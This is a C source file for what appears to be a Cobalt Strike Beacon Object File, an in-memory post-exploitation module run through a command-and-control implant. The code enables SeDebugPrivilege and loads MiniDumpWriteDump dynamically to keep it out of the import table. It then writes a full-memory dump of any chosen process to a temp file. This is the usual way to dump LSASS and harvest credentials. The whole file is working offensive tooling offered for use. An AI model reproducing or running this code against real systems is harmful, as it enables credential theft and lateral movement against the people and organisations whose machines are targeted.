#include <windows.h>
#include <dbghelp.h>
#include "../_include/beacon.h"

// Windows API declarations for BOF
WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess(VOID);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
WINBASEAPI BOOL WINAPI KERNEL32$WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
WINBASEAPI DWORD WINAPI KERNEL32$GetTempPathW(DWORD nBufferLength, LPWSTR lpBuffer);
WINBASEAPI BOOL WINAPI KERNEL32$GetTempFileNameW(LPCWSTR lpPathName, LPCWSTR lpPrefixString, UINT uUnique, LPWSTR lpTempFileName);
WINBASEAPI BOOL WINAPI KERNEL32$GetFileSizeEx(HANDLE hFile, PLARGE_INTEGER lpFileSize);
WINBASEAPI int WINAPI KERNEL32$WideCharToMultiByte(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar);
WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR lpLibFileName);
WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
WINBASEAPI BOOL WINAPI KERNEL32$FreeLibrary(HMODULE hLibModule);

// Advapi32 APIs for privilege management
WINADVAPI BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
WINADVAPI BOOL WINAPI ADVAPI32$LookupPrivilegeValueW(LPCWSTR lpSystemName, LPCWSTR lpName, PLUID lpLuid);
WINADVAPI BOOL WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);

// Function pointer type for MiniDumpWriteDump
typedef BOOL (WINAPI *MiniDumpWriteDumpFunc)(
    HANDLE hProcess,
    DWORD ProcessId,
    HANDLE hFile,
    MINIDUMP_TYPE DumpType,
    PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam,
    PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
    PMINIDUMP_CALLBACK_INFORMATION CallbackParam
);

// Enable debug privileges
BOOL EnableDebugPrivilege(void) {
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES privileges;
    BOOL success = FALSE;
    
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Enabling debug privileges");
    
    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to open process token. Error: %d", KERNEL32$GetLastError());
        return FALSE;
    }
    
    privileges.PrivilegeCount = 1;
    privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
    if (!ADVAPI32$LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &privileges.Privileges[0].Luid)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to lookup privilege value. Error: %d", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hToken);
        return FALSE;
    }
    
    if (!ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &privileges, sizeof(privileges), NULL, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to adjust token privileges. Error: %d", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hToken);
        return FALSE;
    }
    
    DWORD error = KERNEL32$GetLastError();
    if (error == ERROR_NOT_ALL_ASSIGNED) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to assign all requested privileges");
        success = FALSE;
    } else {
        success = TRUE;
    }
    
    KERNEL32$CloseHandle(hToken);
    return success;
}

// Create memory dump file with dynamic loading
BOOL CreateMemoryDump(DWORD processId, WCHAR* outputFileName, DWORD outputFileNameSize) {
    HANDLE hProcess = NULL;
    HANDLE hFile = INVALID_HANDLE_VALUE;
    HMODULE hDbgHelp = NULL;
    MiniDumpWriteDumpFunc pMiniDumpWriteDump = NULL;
    BOOL success = FALSE;
    WCHAR tempPath[MAX_PATH];
    
    // Get temp directory if no output file specified
    DWORD pathLen = KERNEL32$GetTempPathW(MAX_PATH, tempPath);
    if (pathLen == 0 || pathLen > MAX_PATH) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to get temp path. Error: %d", KERNEL32$GetLastError());
        return FALSE;
    }
    
    // Generate unique temp file name
    if (KERNEL32$GetTempFileNameW(tempPath, L"MEMDUMP", 0, outputFileName) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to generate temp file name. Error: %d", KERNEL32$GetLastError());
        return FALSE;
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Creating memory dump file");
    
    // Load dbghelp.dll dynamically
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Loading dbghelp.dll");
    hDbgHelp = KERNEL32$LoadLibraryA("dbghelp.dll");
    if (!hDbgHelp) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to load dbghelp.dll. Error: %d", KERNEL32$GetLastError());
        return FALSE;
    }
    
    // Get MiniDumpWriteDump function pointer
    pMiniDumpWriteDump = (MiniDumpWriteDumpFunc)KERNEL32$GetProcAddress(hDbgHelp, "MiniDumpWriteDump");
    if (!pMiniDumpWriteDump) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to get MiniDumpWriteDump address. Error: %d", KERNEL32$GetLastError());
        KERNEL32$FreeLibrary(hDbgHelp);
        return FALSE;
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Successfully loaded dump functions");
    
    // Open target process
    hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
    if (!hProcess) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to open process %d. Error: %d", processId, KERNEL32$GetLastError());
        //KERNEL32$FreeLibrary(hDbgHelp);
        return FALSE;
    }
    
    // Create output file
    hFile = KERNEL32$CreateFileW(
        outputFileName,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to create dump file. Error: %d", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hProcess);
        //KERNEL32$FreeLibrary(hDbgHelp);
        return FALSE;
    }
    
    // Create minidump using function pointer
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Writing memory dump for process %d", processId);
    
    success = pMiniDumpWriteDump(
        hProcess,
        processId,
        hFile,
        MiniDumpWithFullMemory | MiniDumpWithHandleData | MiniDumpWithUnloadedModules,
        NULL,
        NULL,
        NULL
    );
    
    if (!success) {
        BeaconPrintf(CALLBACK_ERROR, "MiniDumpWriteDump failed. Error: %d", KERNEL32$GetLastError());
    } else {
        // Get file size
        LARGE_INTEGER fileSize;
        if (KERNEL32$GetFileSizeEx(hFile, &fileSize)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Memory dump created successfully. Size: %lld bytes", fileSize.QuadPart);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Memory dump created successfully");
        }
    }
    
    // Cleanup
    KERNEL32$CloseHandle(hFile);
    KERNEL32$CloseHandle(hProcess);
    KERNEL32$FreeLibrary(hDbgHelp);
    
    return success;
}

void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    
    // Get process ID
    DWORD processId = BeaconDataInt(&parser);
    
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Starting memory dump for process %d", processId);
    
    // Enable debug privileges
    if (!EnableDebugPrivilege()) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to enable debug privileges");
        // Continue anyway - might work for some processes
    }
    
    // Create memory dump
    WCHAR dumpFileName[MAX_PATH] = {0};
    if (CreateMemoryDump(processId, dumpFileName, MAX_PATH)) {
        // Convert filename to narrow string for output
        char narrowPath[MAX_PATH];
        int convertedLen = KERNEL32$WideCharToMultiByte(CP_UTF8, 0, dumpFileName, -1, narrowPath, MAX_PATH, NULL, NULL);
        if (convertedLen > 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Memory dump saved to: %s", narrowPath);
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Memory dump completed successfully");
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create memory dump");
    }
}